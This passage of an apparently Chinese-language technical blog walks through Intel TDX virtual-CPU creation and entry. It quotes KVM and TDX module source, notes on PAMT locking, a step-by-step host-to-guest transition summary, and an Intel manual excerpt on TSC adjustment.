Unreachable code.  panic. </span><br><span class=\"line\">     */</span><br><span class=\"line\">    ud2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Meta-data\"><a href=\"#Meta-data\" class=\"headerlink\" title=\"Meta data\"></a>Meta data</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* VMM can pass one 64bit auxiliary data to vcpu via RCX for guest BIOS. */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">tdx_td_vcpu_init</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, u64 vcpu_rcx)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_tdx</span> *<span class=\"title\">kvm_tdx</span> =</span> to_kvm_tdx(vcpu-&gt;kvm);</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vcpu_tdx</span> *<span class=\"title\">tdx</span> =</span> to_tdx(vcpu);</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">long</span> *tdvpx_pa = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">long</span> tdvpr_pa;</span><br><span class=\"line\">        <span class=\"type\">unsigned</span> <span class=\"type\">long</span> va;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, i;</span><br><span class=\"line\">        u64 err;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (is_td_vcpu_created(tdx))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * vcpu_free method frees allocated pages.  Avoid partial setup so</span></span><br><span class=\"line\"><span class=\"comment\">         * that the method can&#x27;t handle it.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        va = __get_free_page(GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!va)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -ENOMEM;</span><br><span class=\"line\">        tdvpr_pa = __pa(va);</span><br><span class=\"line\"></span><br><span class=\"line\">        tdvpx_pa = kcalloc(tdx_info-&gt;nr_tdvpx_pages, <span class=\"keyword\">sizeof</span>(*tdx-&gt;tdvpx_pa),</span><br><span class=\"line\">                           GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!tdvpx_pa) &#123;</span><br><span class=\"line\">                ret = -ENOMEM;</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> free_tdvpr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; tdx_info-&gt;nr_tdvpx_pages; i++) &#123;</span><br><span class=\"line\">                va = __get_free_page(GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!va) &#123;</span><br><span class=\"line\">                        ret = -ENOMEM;</span><br><span class=\"line\">                        <span class=\"keyword\">goto</span> free_tdvpx;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                tdvpx_pa[i] = __pa(va);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        err = tdh_vp_create(kvm_tdx-&gt;tdr_pa, tdvpr_pa);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (KVM_BUG_ON(err, vcpu-&gt;kvm)) &#123;</span><br><span class=\"line\">                ret = -EIO;</span><br><span class=\"line\">                pr_tdx_error(TDH_VP_CREATE, err, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> free_tdvpx;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        tdx-&gt;tdvpr_pa = tdvpr_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">        tdx-&gt;tdvpx_pa = tdvpx_pa;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; tdx_info-&gt;nr_tdvpx_pages; i++) &#123;</span><br><span class=\"line\">                err = tdh_vp_addcx(tdx-&gt;tdvpr_pa, tdvpx_pa[i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (KVM_BUG_ON(err, vcpu-&gt;kvm)) &#123;</span><br><span class=\"line\">                        pr_tdx_error(TDH_VP_ADDCX, err, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (; i &lt; tdx_info-&gt;nr_tdvpx_pages; i++) &#123;</span><br><span class=\"line\">                                free_page((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)__va(tdvpx_pa[i]));</span><br><span class=\"line\">                                tdvpx_pa[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"comment\">/* vcpu_free method frees TDVPX and TDR donated to TDX */</span></span><br><span class=\"line\">                        <span class=\"keyword\">return</span> -EIO;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        err = tdh_vp_init(tdx-&gt;tdvpr_pa, vcpu_rcx);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (KVM_BUG_ON(err, vcpu-&gt;kvm)) &#123;</span><br><span class=\"line\">                pr_tdx_error(TDH_VP_INIT, err, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EIO;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        WARN_ON_ONCE(kvm_apicv_activated(vcpu-&gt;kvm));</span><br><span class=\"line\">        vcpu-&gt;arch.apic-&gt;apicv_active = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        vcpu-&gt;arch.mp_state = KVM_MP_STATE_RUNNABLE;</span><br><span class=\"line\">        tdx-&gt;td_vcpu_created = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">free_tdvpx:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; tdx_info-&gt;nr_tdvpx_pages; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (tdvpx_pa[i])</span><br><span class=\"line\">                        free_page((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)__va(tdvpx_pa[i]));</span><br><span class=\"line\">                tdvpx_pa[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        kfree(tdvpx_pa);</span><br><span class=\"line\">        tdx-&gt;tdvpx_pa = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">free_tdvpr:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tdvpr_pa)</span><br><span class=\"line\">                free_page((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)__va(tdvpr_pa));</span><br><span class=\"line\">        tdx-&gt;tdvpr_pa = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">api_error_type <span class=\"title function_\">tdh_vp_create</span><span class=\"params\">(<span class=\"type\">uint64_t</span> target_tdvpr_pa, <span class=\"type\">uint64_t</span> target_tdr_pa)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// TDVPS related variables</span></span><br><span class=\"line\">    <span class=\"type\">pa_t</span>                  tdvpr_pa;                  <span class=\"comment\">// TDVPR physical address</span></span><br><span class=\"line\">    <span class=\"type\">tdvps_t</span>             * tdvps_ptr;                 <span class=\"comment\">// Pointer to the TDVPS (multi-page linear address)</span></span><br><span class=\"line\">    <span class=\"type\">pamt_block_t</span>          tdvpr_pamt_block;          <span class=\"comment\">// TDVPR PAMT block</span></span><br><span class=\"line\">    <span class=\"type\">pamt_entry_t</span>        * tdvpr_pamt_entry_ptr;      <span class=\"comment\">// Pointer to the TDVPR PAMT entry</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                tdvpr_locked_flag = <span class=\"literal\">false</span>; <span class=\"comment\">// Indicate TDVPR is locked</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// TDR related variables</span></span><br><span class=\"line\">    <span class=\"type\">pa_t</span>                  tdr_pa;                    <span class=\"comment\">// TDR physical address</span></span><br><span class=\"line\">    <span class=\"type\">tdr_t</span>               * tdr_ptr;                   <span class=\"comment\">// Pointer to the TDR page (linear address)</span></span><br><span class=\"line\">    <span class=\"type\">pamt_block_t</span>          tdr_pamt_block;            <span class=\"comment\">// TDR PAMT block</span></span><br><span class=\"line\">    <span class=\"type\">pamt_entry_t</span>        * tdr_pamt_entry_ptr;        <span class=\"comment\">// Pointer to the TDR PAMT entry</span></span><br><span class=\"line\">    <span class=\"type\">bool_t</span>                tdr_locked_flag = <span class=\"literal\">false</span>;   <span class=\"comment\">// Indicate TDR is locked</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">tdcs_t</span>              * tdcs_ptr = <span class=\"literal\">NULL</span>;           <span class=\"comment\">// Pointer to the TDCS page (linear address)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    api_error_type        return_val = UNINITIALIZE_ERROR;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdvpr_pa.raw = target_tdvpr_pa;</span><br><span class=\"line\">    tdr_pa.raw = target_tdr_pa;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check, lock and map the owner TDR page</span></span><br><span class=\"line\">    return_val = check_lock_and_map_explicit_tdr(tdr_pa,</span><br><span class=\"line\">                                                 OPERAND_ID_RDX,</span><br><span class=\"line\">                                                 TDX_RANGE_RW,</span><br><span class=\"line\">                                                 TDX_LOCK_SHARED,</span><br><span class=\"line\">                                                 PT_TDR,</span><br><span class=\"line\">                                                 &amp;tdr_pamt_block,</span><br><span class=\"line\">                                                 &amp;tdr_pamt_entry_ptr,</span><br><span class=\"line\">                                                 &amp;tdr_locked_flag,</span><br><span class=\"line\">                                                 &amp;tdr_ptr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to check/lock/map a TDR - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Map the TDCS structure and check the state</span></span><br><span class=\"line\">    return_val = check_state_map_tdcs_and_lock(tdr_ptr, TDX_RANGE_RW, TDX_LOCK_SHARED,</span><br><span class=\"line\">                                               <span class=\"literal\">false</span>, TDH_VP_CREATE_LEAF, &amp;tdcs_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;State check or TDCS lock failure - error = %llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check, lock and map the new TDVPR page</span></span><br><span class=\"line\">    return_val = check_lock_and_map_explicit_private_4k_hpa(tdvpr_pa,</span><br><span class=\"line\">                                                            OPERAND_ID_RCX,</span><br><span class=\"line\">                                                            tdr_ptr,</span><br><span class=\"line\">                                                            TDX_RANGE_RW,</span><br><span class=\"line\">                                                            TDX_LOCK_EXCLUSIVE,</span><br><span class=\"line\">                                                            PT_NDA,</span><br><span class=\"line\">                                                            &amp;tdvpr_pamt_block,</span><br><span class=\"line\">                                                            &amp;tdvpr_pamt_entry_ptr,</span><br><span class=\"line\">                                                            &amp;tdvpr_locked_flag,</span><br><span class=\"line\">                                                            (<span class=\"type\">void</span>**)&amp;tdvps_ptr);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (return_val != TDX_SUCCESS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TDX_ERROR(<span class=\"string\">&quot;Failed to check/lock/map a TDVPR - error = 0x%llx\\n&quot;</span>, return_val);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> EXIT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ALL_CHECKS_PASSED:  The function is guaranteed to succeed</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Clear the content of the TDVPR page using direct writes</span></span><br><span class=\"line\">    zero_area_cacheline(tdvps_ptr, TDX_PAGE_SIZE_IN_BYTES);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Initialize TDVPS management fields.</span></span><br><span class=\"line\"><span class=\"comment\">     * Fields which are initialized to zero are implicitly zero&#x27;d in the</span></span><br><span class=\"line\"><span class=\"comment\">     * previous state.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    tdvps_ptr-&gt;management.num_tdvps_pages = <span class=\"number\">1</span>;</span><br><span class=\"line\">    tdvps_ptr-&gt;management.assoc_lpid = (<span class=\"type\">uint32_t</span>)<span class=\"number\">-1</span>;</span><br><span class=\"line\">    tdvps_ptr-&gt;management.tdvps_pa[<span class=\"number\">0</span>] = assign_hkid_to_hpa(tdr_ptr, tdvpr_pa).raw;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Register the new TDVPR page in its owner TDR</span></span><br><span class=\"line\">    (<span class=\"type\">void</span>)_lock_xadd_64b(&amp;(tdr_ptr-&gt;management_fields.chldcnt), <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set the new TDVPR page PAMT fields</span></span><br><span class=\"line\">    tdvpr_pamt_entry_ptr-&gt;pt = PT_TDVPR;</span><br><span class=\"line\">    set_pamt_entry_owner(tdvpr_pamt_entry_ptr, tdr_pa);</span><br><span class=\"line\"></span><br><span class=\"line\">EXIT:</span><br><span class=\"line\">    <span class=\"comment\">// Release all acquired locks and free keyhole mappings</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdvpr_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        pamt_unwalk(tdvpr_pa, tdvpr_pamt_block, tdvpr_pamt_entry_ptr, TDX_LOCK_EXCLUSIVE, PT_4KB);</span><br><span class=\"line\">        free_la(tdvps_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        release_sharex_lock_hp_sh(&amp;tdcs_ptr-&gt;management_fields.op_state_lock);</span><br><span class=\"line\">        free_la(tdcs_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdr_locked_flag)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        pamt_unwalk(tdr_pa, tdr_pamt_block, tdr_pamt_entry_ptr, TDX_LOCK_SHARED, PT_4KB);</span><br><span class=\"line\">        free_la(tdr_ptr);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> return_val;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Lock\"><a href=\"#Lock\" class=\"headerlink\" title=\"Lock\"></a>Lock</h3><p>没有成功上锁会直接返回错误 TDX_OPERAND_BUSY</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// shared/exclusive lock with host priority</span></span><br><span class=\"line\">_STATIC_INLINE_ api_error_code_e <span class=\"title function_\">acquire_sharex_lock_hp</span><span class=\"params\">(<span class=\"type\">sharex_hp_lock_t</span> * lock_ptr, <span class=\"type\">lock_type_t</span> lock_type,</span></span><br><span class=\"line\"><span class=\"params\">                                                        <span class=\"type\">bool_t</span> is_guest)</span><span class=\"comment\">//is_guest=false</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (lock_type == TDX_LOCK_EXCLUSIVE)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> acquire_sharex_lock_hp_ex(lock_ptr, is_guest);</span><br><span class=\"line\">                                    _STATIC_INLINE_ api_error_code_e <span class=\"title function_\">acquire_sharex_lock_hp_ex</span><span class=\"params\">(<span class=\"type\">sharex_hp_lock_t</span> * lock_ptr, <span class=\"type\">bool_t</span> is_guest)</span></span><br><span class=\"line\">                                    &#123;</span><br><span class=\"line\">                                        <span class=\"type\">sharex_hp_lock_t</span> retval;</span><br><span class=\"line\">                                    </span><br><span class=\"line\">                                        tdx_debug_assert(lock_ptr != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                                    </span><br><span class=\"line\">                                        retval.raw = _lock_cmpxchg_16b(SHAREX_HP_FREE, SHAREX_HP_EXCLUSIVE_LOCK, &amp;lock_ptr-&gt;raw); <span class=\"comment\">// Set EXCLUSIVE to 1</span></span><br><span class=\"line\">                                    </span><br><span class=\"line\">                                        <span class=\"keyword\">if</span> (retval.raw == SHAREX_HP_FREE)</span><br><span class=\"line\">                                        &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (retval.raw == SHAREX_HP_HOST_PRIORITY)</span><br><span class=\"line\">                                        &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (is_guest)</span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> TDX_OPERAND_BUSY_HOST_PRIORITY;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                            <span class=\"keyword\">else</span></span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"comment\">// HOST_PRIORITY is 1, try again if you are host</span></span><br><span class=\"line\">                                                <span class=\"comment\">// Set EXCLUSIVE to 1, clear HOST_PRIORITY</span></span><br><span class=\"line\">                                                retval.raw = _lock_cmpxchg_16b(SHAREX_HP_HOST_PRIORITY, SHAREX_HP_EXCLUSIVE_LOCK, &amp;lock_ptr-&gt;raw);</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> (retval.raw == SHAREX_HP_HOST_PRIORITY) ? TDX_SUCCESS : TDX_OPERAND_BUSY;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                        <span class=\"keyword\">else</span></span><br><span class=\"line\">                                        &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (is_guest)</span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> TDX_OPERAND_BUSY;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                            <span class=\"keyword\">else</span></span><br><span class=\"line\">                                            &#123;</span><br><span class=\"line\">                                                _lock_or_16b(&amp;lock_ptr-&gt;raw, SHAREX_HP_HOST_PRIORITY);</span><br><span class=\"line\">                                                <span class=\"keyword\">return</span> TDX_OPERAND_BUSY;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (lock_type == TDX_LOCK_SHARED)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> acquire_sharex_lock_hp_sh(lock_ptr, is_guest);</span><br><span class=\"line\">                            _STATIC_INLINE_ api_error_code_e <span class=\"title function_\">acquire_sharex_lock_hp_sh</span><span class=\"params\">(<span class=\"type\">sharex_hp_lock_t</span> * lock_ptr, <span class=\"type\">bool_t</span> is_guest)</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                            <span class=\"type\">sharex_hp_lock_t</span> retval;</span><br><span class=\"line\">                        </span><br><span class=\"line\">                            tdx_debug_assert(lock_ptr != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                        </span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (is_guest)</span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"comment\">// Increment SHARE_COUNTER</span></span><br><span class=\"line\">                                retval.raw = _lock_xadd_16b(&amp;lock_ptr-&gt;raw, SHAREX_HP_SINGLE_READER);</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (retval.host_prio)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    <span class=\"comment\">// Decrement SHARE_COUNTER</span></span><br><span class=\"line\">                                    retval.raw = _lock_xadd_16b(&amp;lock_ptr-&gt;raw, (<span class=\"type\">uint16_t</span>)-SHAREX_HP_SINGLE_READER);</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> TDX_OPERAND_BUSY_HOST_PRIORITY;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (retval.exclusive)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> TDX_OPERAND_BUSY; <span class=\"comment\">// Counter is n/a</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"comment\">// Sanity-check the counter after we know that exclusive bit was not set</span></span><br><span class=\"line\">                                <span class=\"comment\">// Only when exclusive bit is not set the shared-counters has &quot;real&quot; &quot;readers&quot;</span></span><br><span class=\"line\">                                <span class=\"comment\">// And that number should not overflow</span></span><br><span class=\"line\">                                tdx_sanity_check((retval.counter != SHAREX_HP_FULL_COUNTER), SCEC_LOCK_SOURCE, <span class=\"number\">10</span>);</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">else</span></span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"comment\">// Increment SHARE_COUNTER</span></span><br><span class=\"line\">                                retval.raw = _lock_xadd_16b(&amp;lock_ptr-&gt;raw, SHAREX_HP_SINGLE_READER);</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (retval.exclusive)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    _lock_or_16b(&amp;lock_ptr-&gt;raw, SHAREX_HP_HOST_PRIORITY);</span><br><span class=\"line\">                                    <span class=\"keyword\">return</span> TDX_OPERAND_BUSY;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (retval.host_prio)</span><br><span class=\"line\">                                &#123;</span><br><span class=\"line\">                                    <span class=\"comment\">// Leave SHARE_COUNTER incremented and reset HP bit</span></span><br><span class=\"line\">                                    _lock_and_16b(&amp;lock_ptr-&gt;raw, (<span class=\"type\">uint16_t</span>)~SHAREX_HP_HOST_PRIORITY);</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"comment\">// Sanity-check the counter after we know that exclusive bit was not set</span></span><br><span class=\"line\">                                <span class=\"comment\">// Only when exclusive bit is not set the shared-counters has &quot;real&quot; &quot;readers&quot;</span></span><br><span class=\"line\">                                <span class=\"comment\">// And that number should not overflow</span></span><br><span class=\"line\">                                tdx_sanity_check((retval.counter != SHAREX_HP_FULL_COUNTER), SCEC_LOCK_SOURCE, <span class=\"number\">11</span>);</span><br><span class=\"line\">                        </span><br><span class=\"line\">                                <span class=\"keyword\">return</span> TDX_SUCCESS;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdx_sanity_check(<span class=\"number\">0</span>, SCEC_LOCK_SOURCE, <span class=\"number\">12</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Not supposed to return this after sanity check</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> UNINITIALIZE_ERROR;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Pamt 管理了整个 tdx 的物理内存使用(hkid) 类似 rmptable?</p>\n<p>为什么要加锁？</p>\n<ol>\n<li>Tdx module 切换使用了 tdr tdvpr 的数据结构 (shared)</li>\n<li>kvm 其他线程可能会修改 pamt (exclusive)</li>\n</ol>\n<p>如果类比简单的 function call  传参使用寄存器的保存可以不用另一块内存 而使用栈 那么就不需要额外对 pamt entry 的加锁操作(lock_xadd_16b 是否比较慢)</p>\n<h3 id=\"Sum\"><a href=\"#Sum\" class=\"headerlink\" title=\"Sum\"></a>Sum</h3><p>host-&gt;firmware-&gt;guest-&gt;firmware-&gt;host</p>\n<ol>\n<li>host 将参数通过通用寄存器传参给 tdx module(先写到内存 再写到寄存器)  seamcall</li>\n<li>tdx module 保存通用寄存器到内存并清零</li>\n<li>对 pamt entry 加共享锁</li>\n<li>map (keyhole)  tdvps</li>\n<li>check_and_associate_vcpu 为了 VCPU state 的缓存一致性</li>\n<li>set_vm_vmcs_as_active(tdvps_ptr, tdvps_ptr-&gt;management.curr_vm);</li>\n<li>检查 tsc (rdmsr)</li>\n<li>adjust_tlb_tracking_state 如果 epoch 不一致则刷缓存</li>\n<li>handle_stepping_filter 根据 rip 变化检查 zero-step attack 报告给 guest  ept violation</li>\n<li>如果上次 vmexit 是因为 vmcall 则把 vmm 的寄存器再传给 vm 的寄存器(内存)</li>\n<li>恢复 guest 其他状态 比如 debug_registers&#x2F;performance monitoring counters&#x2F;msr  extended state(xmm)</li>\n<li>从内存中恢复 guest 通用寄存器的值  vmresume&#x2F;vmlaunch</li>\n<li>guest 将参数通过通用寄存器传参给 tdx module  tdcall 对应 1</li>\n<li>tdx module 保存通用寄存器并清零 对应 2</li>\n<li>所有通用寄存器换个内存地址再存一遍</li>\n<li>某些情况需要 inject_ve 然后进 guest 的 ve handler 转成 tdcall 再来一遍</li>\n<li>vm 通用寄存器传给 vmm(内存) 对应 10</li>\n<li>存 guest 其他状态(extended states  xfam) 对应 11</li>\n<li>tlb track 对应 8</li>\n<li>放锁 对应 3</li>\n<li>set_seam_vmcs_as_active</li>\n<li>load_vmm_state_before_td_exit 恢复 host 状态</li>\n<li>从内存中恢复 host 通用寄存器的值 seamret 对应 12</li>\n</ol>\n<p>修改 tdvps：</p>\n<ol>\n<li>tdvps_ptr-&gt;management.last_seamdb_index   tdx module update 需要支持 td-preserving</li>\n<li>tdvps_p-&gt;management.module_dependent_hpa_updated  和 tdx module update  vCPU 调度有关</li>\n<li>tdvps-&gt;ptr-&gt;management.assoc_lpid   vCPU 调度</li>\n<li>tdcs_ptr-&gt;epoch_tracking-&gt;epoch_and_refcount     tlb track</li>\n<li>tdvps_ptr-&gt;management.state &#x3D; VCPU_ACTIVE  与 migration 有关</li>\n<li>step 检查失败 退出前 management.state 和 management.last_td_exit</li>\n<li>嵌套虚拟化 l2_xxx</li>\n</ol>\n<h3 id=\"Check-tsc\"><a href=\"#Check-tsc\" class=\"headerlink\" title=\"Check tsc\"></a>Check tsc</h3><p><a href=\"https://forums.guru3d.com/threads/a-bit-detailed-info-on-intel-time-stamp-counter-tsc.433977/\">https://forums.guru3d.com/threads/a-bit-detailed-info-on-intel-time-stamp-counter-tsc.433977/</a></p>\n<blockquote>\n<p>17.15.3 Time-Stamp Counter Adjustment</p>\n<p>Software can modify the value of the time-stamp counter (TSC) of a logical processor by using the WRMSR instruction to write to the IA32_TIME_STAMP_COUNTER MSR (address 10H). Because such a write applies only to that logical processor, software seeking to synchronize the TSC values of multiple logical processors must perform these writes on each logical processor. It may be difficult for software to do this in a way than ensures that all logical processors will have the same value for the TSC at a given point in time.<br>The synchronization of TSC adjustment can be simplified by using the 64-bit IA32_TSC_ADJUST MSR (address 3BH). Like the IA32_TIME_STAMP_COUNTER MSR, the IA32_TSC_ADJUST MSR is maintained separately for each logical processor. A logical processor maintains and uses the IA32_TSC_ADJUST MSR as follows:<br>• On RESET, the value of the IA32_TSC_ADJUST MSR is 0.<br>• If an execution of WRMSR to the IA32_TIME_STAMP_COUNTER MSR adds (or subtracts) value X from the TSC, the logical processor also adds (or subtracts) value X from the IA32_TSC_ADJUST MSR.<br>• If an execution of WRMSR to the IA32_TSC_ADJUST MSR adds (or subtracts) value X from that MSR, the logical processor also adds (or subtracts) value X from the TSC.</p>\n<p>Unlike the TSC, the value of the IA32_TSC_ADJUST MSR changes only in response to WRMSR (either to the MSR itself, or to the IA32_TIME_STAMP_COUNTER MSR). Its value does not otherwise change as time elapses. Software seeking to adjust the TSC can do so by using WRMSR to write the same value to the IA32_TSC_ADJUST MSR on each logical processor.<br>Processor support for the IA32_TSC_ADJUST MSR is indicated by CPUID.(EAX&#x3D;07H, ECX&#x3D;0H):EBX.TSC_ADJUST (bit 1).</p>\n</blockquote>\n<p><a 